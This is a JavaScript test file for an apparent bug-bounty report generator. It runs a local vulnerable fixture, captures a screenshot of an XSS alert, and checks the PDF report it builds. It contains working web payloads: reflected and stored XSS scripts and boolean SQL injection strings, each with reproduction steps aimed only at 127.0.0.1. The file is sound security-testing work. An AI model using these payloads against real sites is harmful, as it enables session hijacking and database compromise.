async function waitForHealth(url, timeoutMs = 15000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const res = await fetch(`${url}/health`);
      if (res.ok) return true;
    } catch { /* not up yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  return false;
}

// File-scoped fixture: E23 also needs the live fixture when run standalone.
before(async () => {
  fixtureProc = spawn('python3', ['tests/fixtures/vuln_fixture.py', String(FIXTURE_PORT)], {
    stdio: ['ignore', 'pipe', 'pipe']
  });
  const up = await waitForHealth(FIXTURE_URL);
  assert.ok(up, 'fixture server did not start');
});

after(() => {
  if (fixtureProc) fixtureProc.kill('SIGKILL');
});

/**
 * The real reflected-XSS proof shot: a headless-Chromium capture of the
 * fixture's /search with a live alert() firing. D21 writes it; E23 reuses it --
 * and regenerates it on demand so E23 passes when run standalone too.
 */
async function ensureProofShot() {
  try {
    return readFileSync(PROOF_SHOT_PATH);
  } catch { /* not staged yet -- capture it below */ }
  const payload = encodeURIComponent(`<script>alert('XSS confirmed at '+document.domain)</script>`);
  const { ok, proof, error } = await captureHeadlessProof({
    url: `${FIXTURE_URL}/search?q=${payload}`,
    finding: { id: 'f-xss-1', type: 'xss_reflected', title: 'Reflected XSS in /search', confidence: 'confirmed' },
    scriptPath: 'scripts/capture_proof_shot.py',
    outDir: join(tmpdir(), 'dm-proofs')
  });
  assert.ok(ok, `proof capture failed: ${error}`);
  assert.equal(proof.dialogFired, true, 'the injected alert() must actually fire in the browser');
  assert.ok(/127\.0\.0\.1/.test(proof.dialogMessage || ''), 'dialog message must come from the page');
  assert.ok(isUsableProof({ screenshot: proof }), 'proof must be report-usable');
  const bytes = Buffer.from(proof.data, 'base64');
  assert.ok(bytes.length > 5000, 'screenshot must have real image content');
  writeFileSync(PROOF_SHOT_PATH, bytes);
  return bytes;
}

describe('D21 visual proof (real headless capture)', () => {
  it('captures a REAL screenshot with the XSS alert firing', async () => {
    const shot = await ensureProofShot();
    const { width, height } = jpegDimensions(shot);
    assert.ok(width > 100 && height > 100, 'screenshot must have real dimensions');
  }, { timeout: 90000 });
});

// ── E23: REAL PDF from REAL hunt data ─────────────────────────────────────

describe('E23 real PDF from real hunt data', () => {  it('builds a multi-page PDF with findings, CVSS, evidence, screenshot — and reads it back', async () => {
    const shot = await ensureProofShot(); // REAL capture of the live fixture (regenerates if missing)
    const { width, height } = jpegDimensions(shot);
    assert.ok(width > 100 && height > 100, 'screenshot must have real dimensions');

    const findings = applyCvssToAll([
      {
        title: 'Reflected XSS in /search (q parameter)',
        severity: 'high', type: 'xss_reflected', status: 'validated',
        affectedEndpoint: '/search', parameter: 'q',
        description: 'The q parameter of /search is reflected into the HTML response without output encoding. Verified live: an injected <script> executed in headless Chromium (alert fired, DOM marker rendered).',
        impact: 'An attacker can craft a malicious link that executes JavaScript in a victim session — session hijacking, defacement, phishing.',
        reproductionSteps: [
          'GET http://127.0.0.1:4567/search?q=<script>alert(1)</script>',
          'Observe the unescaped reflection and the executed alert in the browser.'
        ],
        remediation: ['Encode all reflected output with context-appropriate escaping.', 'Deploy a Content-Security-Policy.'],
        evidence: [{ kind: 'screenshot', summary: 'alert fired in headless Chromium', dialogFired: true }]
      },
      {
        title: 'Boolean-based SQL injection in /user (id parameter)',
        severity: 'critical', type: 'sqli', status: 'validated',
        affectedEndpoint: '/user', parameter: 'id',
        description: "The id parameter is interpolated into a SQL query. '?id=' AND '1'='1 returns the user row while ' AND '1'='2 returns 'No such user' — a true/false differential. A bare quote triggers a SQL syntax error.",
        impact: 'Full database compromise is possible: data extraction, authentication bypass, and (depending on DB user) further escalation.',
        reproductionSteps: [
          "GET /user?id=' AND '1'='1 → user row returned",
          "GET /user?id=' AND '1'='2 → 'No such user'"
        ],
        remediation: ['Use parameterized queries / prepared statements.', 'Apply least-privilege DB accounts.'],
        evidence: [{ kind: 'tool_output', summary: 'true/false response differential + syntax error' }]
      },
      {
        title: 'Stored XSS in /guestbook comments',
        severity: 'high', type: 'xss_stored', status: 'validated',
        affectedEndpoint: '/guestbook', parameter: 'comment',
        description: 'Posted comments are stored and later rendered without escaping. A comment containing <img src=x onerror=alert(1)> was persisted and rendered verbatim on reload.',
        impact: 'Every visitor of the guestbook executes the attacker script — mass session theft, malware delivery.',
        reproductionSteps: [
          'POST /guestbook with comment=<img src=x onerror=alert(1)>',
          'GET /guestbook → payload rendered unescaped'
        ],
        remediation: ['Encode stored content on output.', 'Validate input on the way in.'],
        evidence: [{ kind: 'tool_output', summary: 'payload persisted and reflected verbatim' }]
      }
    ]);

    const coverage = owaspCoverage(findings);
    const pdf = buildReportPdf({
      title: 'Bug Bounty Assessment Report — 127.0.0.1:4567',
      target: 'http://127.0.0.1:4567',
      generatedAt: '2026-10-02T00:00:00.000Z',
      mode: 'technical',
      summary: { critical: 1, high: 2, medium: 0, low: 0, informational: 0, validated: 3 },
      executiveSummary: `An authorized assessment of the local fixture confirmed 3 vulnerabilities: 1 critical SQL injection, 1 high reflected XSS and 1 high stored XSS. OWASP Top-10 coverage: ${coverage.percent}% (${coverage.covered.map((c) => c.id).join(', ')}).`,
      findings: findings.map((f) => ({ ...f, repro: generateRepro({ url: `http://127.0.0.1:4567${f.affectedEndpoint}`, parameter: f.parameter, method: 'GET' }) })),
      screenshots: [{ jpeg: shot, caption: 'Visual proof: reflected-XSS alert executed in headless Chromium (127.0.0.1:4567/search)' }]
    });

    assert.ok(pdf.length > 5000, 'PDF must have real content');
    const v = verifyReportPdf(pdf, [
      'Reflected XSS in /search',
      'Boolean-based SQL injection',
      'Stored XSS in /guestbook',
      'CVSS',
      'Content-Security-Policy',
      '127.0.0.1:4567'
    ]);
    assert.ok(v.pages >= 2, `expected multi-page PDF, got ${v.pages}`);
    assert.deepEqual(v.missing, [], `strings missing from parsed PDF: ${v.missing.join(', ')}`);
    assert.ok(v.textRuns > 50, 'PDF must contain substantial extracted text');
  });
});
